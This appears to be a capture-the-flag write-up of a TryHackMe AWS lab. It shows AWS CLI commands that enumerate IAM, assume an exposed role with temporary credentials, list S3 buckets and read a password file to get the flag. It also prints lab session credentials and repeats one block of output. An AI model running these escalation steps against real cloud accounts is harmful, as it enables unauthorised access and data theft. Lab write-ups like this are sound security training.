# AWS Security - S3cret Santa

## Challenge Overview
This challenge focused on exploiting misconfigured AWS IAM permissions using valid programmatic credentials. 
Starting with an AWS Access Key ID and Secret Access Key, the task involved enumerating IAM users, policies, and roles to identify privilege escalation opportunities. 
By leveraging the AWS Security Token Service (STS) and assuming an exposed role, the objective was to access Amazon S3 buckets and retrieve sensitive data stored within them.

## Learnings
From this challenge, I learned:
- How AWS CLI credentials are used for programmatic access and validated using sts get-caller-identity
- The structure and purpose of IAM Users, Groups, Roles, and Policies
- The difference between inline policies and managed (attached) policies
- How the permission sts:AssumeRole can enable privilege escalation
- How to enumerate IAM entities using read-only IAM permissions
- How temporary credentials (Access Key, Secret Key, Session Token) work when assuming a role
- The importance of correctly exporting environment variables for AWS CLI usage
- How Amazon S3 buckets can be enumerated and accessed once permissions are obtained

## My Solve 
Following the instructions provided, the following was my approach to solve the challenge and answer each question:
**Terminal Working for first answer:**
```
ubuntu@tryhackme:~$ aws sts get-caller-identity
{
    "UserId": "neungp5sjr1590tufxah",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/sir.carrotbane"
}
```
The `Account` parameter was the answer.

**Terminal Working for third answer:**
I used the following command to list the policy : `aws iam list-user-policies --user-name sir.carrotbane`
 `Sir CarrotbanePolicy` was the answer.

**Terminal Working for fourth answer:**
```
<img width="1920" height="1075" alt="Screenshot 2025-12-24 123042" src="https://github.com/user-attachments/assets/fa577048-8353-474e-9cfb-0b50f47465d8" />

```

**Terminal Working for fifth answer:**
```
ubuntu@tryhackme:~$ aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name tbfc
{
    "Credentials": {
        "AccessKeyId": "ASIARZPUZDIKNCHLYNTZ",
        "SecretAccessKey": "LmSBheAsYC1vxqd4euSzJplSlhTMvAL1ugBigOiW",
        "SessionToken": "FQoGZXIvYXdzEBYaDj+Klm6ViQkb5T/EQkCivMKts/AlwqoxJN02eZbq0GfWmLscHFYZX7uM0dTJZ/sdhUGTNKiYN2H6fVQsy4oGsvIpa5/QldmGHaeWZqQdEWFL7ogbyss4tOFrxhvZ66RYHW7/dW7z0OeMK43xO5N9ipiEVRoKqo3l2hFOnn2gjzJFKM8sh08pWtihciQSLksYsWwJlHCxXFkl9d/r3ddy5yp38tA7r3PZhWlLywHj6kVTlF566F35Iw80VKXnbEkDvBuO7E6W3eXydo6VYSXhKJCw8oD9mIle06auWf+6Qfqp3VKS8l8IIngmvtiWKAOLQKQZgw89EtRtoGDleCc=",
        "Expiration": "2025-12-24T19:42:49.434486+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARZPUZDIKK76R5Z4AC:tbfc",
        "Arn": "arn:aws:sts::123456789012:assumed-role/bucketmaster/tbfc"
    },
    "PackedPolicySize": 6
}
ubuntu@tryhackme:~$ export AWS_ACCESS_KEY_ID="ASIARZPUZDIKNCHLYNTZ"
ubuntu@tryhackme:~$ export AWS_SECRET_ACCESS_KEY="LmSBheAsYC1vxqd4euSzJplSlhTMvAL1ugBigOiW"
ubuntu@tryhackme:~$ export AWS_SESSION_TOKEN="^C
ubuntu@tryhackme:~$ export AWS_SESSION_TOKEN="FQoGZXIvYXdzEBYaDj+Klm6ViQkb5T/EQkCivMKts/AlwqoxJN02eZbq0GfWmLscHFYZX7uM0dTJZ/sdhUGTNKiYN2H6fVQsy4oGsvIpa5/QldmGHaeWZqQdEWFL7ogbyss4tOFrxhvZ66RYHW7/dW7z0OeMK43xO5N9ipiEVRoKqo3l2hFOnn2gjzJFKM8sh08pWtihciQSLksYsWwJlHCxXFkl9d/r3ddy5yp38tA7r3PZhWlLywHj6kVTlF566F35Iw80VKXnbEkDvBuO7E6W3eXydo6VYSXhKJCw8oD9mIle06auWf+6Qfqp3VKS8l8IIngmvtiWKAOLQKQZgw89EtRtoGDleCc="
ubuntu@tryhackme:~$ aws sts get-caller-identity
{
    "UserId": "AROARZPUZDIKK76R5Z4AC:tbfc",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/bucketmaster/tbfc"
}
ubuntu@tryhackme:~$ aws s3api list-buckets
{
    "Buckets": [
        {
            "Name": "bunny-website-645341",
            "CreationDate": "2025-12-24T18:34:09+00:00"
        },
        {
            "Name": "easter-secrets-123145",
            "CreationDate": "2025-12-24T18:34:09+00:00"
        }
    ],
    "Owner": {
        "DisplayName": "webfile",
        "ID": "bcaf1ffd86f41161ca5fb16fd081034f"
    },
    "Prefix": null
}
ubuntu@tryhackme:~$ aws s3api list-objects --bucket easter-secrets-123145
{
    "Contents": [
        {
            "Key": "cloud_password.txt",
            "LastModified": "2025-12-24T18:34:09+00:00",
            "ETag": "\"c63e1474bf79a91ef95a1e6c8305a304\"",
            "Size": 29,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "webfile",
                "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
            }
        },
        {
            "Key": "groceries.txt",
            "LastModified": "2025-12-24T18:34:09+00:00",
            "ETag": "\"44a93e970be00ed62b8742f42c8600d8\"",
            "Size": 28,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "webfile",
                "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
:
    "Contents": [
        {
            "Key": "cloud_password.txt",
            "LastModified": "2025-12-24T18:34:09+00:00",
            "ETag": "\"c63e1474bf79a91ef95a1e6c8305a304\"",
            "Size": 29,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "webfile",
                "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
            }
        },
        {
            "Key": "groceries.txt",
            "LastModified": "2025-12-24T18:34:09+00:00",
            "ETag": "\"44a93e970be00ed62b8742f42c8600d8\"",
            "Size": 28,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "webfile",
                "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
ubuntu@tryhackme:~$ aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt
{
    "AcceptRanges": "bytes",
    "LastModified": "2025-12-24T18:34:09+00:00",
    "ContentLength": 29,
    "ETag": "\"c63e1474bf79a91ef95a1e6c8305a304\"",
    "ContentType": "application/octet-stream",
    "Metadata": {}
}
ubuntu@tryhackme:~$ ls 
 Desktop     Music      Templates   cloud_password.txt
 Documents   Pictures  'VM 5.png'   snap
 Downloads   Public     Videos
ubuntu@tryhackme:~$ cat cloud_password.txt
THM{more_like_sir_cloudbane}


```

## Flag / Answers
- Final flag : ```THM{more_like_sir_cloudbane}```
